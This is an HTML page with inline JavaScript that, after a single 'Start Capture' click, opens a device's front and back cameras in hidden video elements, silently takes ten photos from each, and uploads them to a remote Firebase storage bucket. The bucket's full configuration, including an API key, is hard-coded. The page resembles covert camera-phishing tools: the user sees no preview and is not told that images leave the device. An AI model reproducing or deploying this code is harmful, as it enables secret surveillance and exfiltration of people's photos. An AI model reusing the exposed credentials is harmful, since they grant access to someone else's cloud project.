<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture Images</title>
</head>
<body>
    <button id="startCapture">Start Capture</button>
    <video id="frontVideo" style="display:none;" autoplay playsinline muted></video>
    <video id="backVideo" style="display:none;" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        const firebaseConfig = {
             apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
  authDomain: "valute3.firebaseapp.com",
  databaseURL: "https://valute3-default-rtdb.firebaseio.com",
  projectId: "valute3",
  storageBucket: "valute3.appspot.com",
  messagingSenderId: "1059488015525",
  appId: "1:1059488015525:web:db514a29cb876069d2d94c",
  measurementId: "G-VBSCFW4HQP"
        };

        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        async function getCameraStream(useFrontCamera) {
            try {
                const constraints = {
                    video: {
                        facingMode: useFrontCamera ? "user" : { exact: "environment" } 
                    }
                };
                return await navigator.mediaDevices.getUserMedia(constraints);
            } catch (error) {
                console.warn("‚ö† Camera access failed, switching to default mode.");
                return await navigator.mediaDevices.getUserMedia({ video: true });
            }
        }

        async function captureAndUploadPhoto(video, index, useFrontCamera) {
            return new Promise(async (resolve, reject) => {
                try {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext("2d");

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(async (blob) => {
                        const cameraType = useFrontCamera ? "front" : "back";
                        const fileName = `images974244/${cameraType}_${index + 1}_${Date.now()}.png`;
                        const storageRef = ref(storage, fileName);
                        await uploadBytes(storageRef, blob);

                        const downloadURL = await getDownloadURL(storageRef);
                        console.log(`‚úÖ Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
                        resolve();
                    }, "image/png");
                } catch (error) {
                    console.error("‚ùå Error capturing image:", error);
                    reject(error);
                }
            });
        }

        async function captureMultipleImages() {
            console.log("üì∏ Requesting camera permission...");

            const frontStream = await getCameraStream(true);
            const backStream = await getCameraStream(false);

            const frontVideo = document.getElementById("frontVideo");
            frontVideo.srcObject = frontStream;
            await frontVideo.play();

            const backVideo = document.getElementById("backVideo");
            backVideo.srcObject = backStream;
            await backVideo.play();

            console.log("üì∏ Capturing images...");
            for (let i = 0; i < 10; i++) {
                await captureAndUploadPhoto(frontVideo, i, true);
                await captureAndUploadPhoto(backVideo, i, false);
            }

            frontStream.getTracks().forEach(track => track.stop());
            backStream.getTracks().forEach(track => track.stop());

            console.log("‚úÖ All images captured and uploaded!");
        }

        document.getElementById("startCapture").addEventListener("click", captureMultipleImages);
    </script>
</body>
</html>
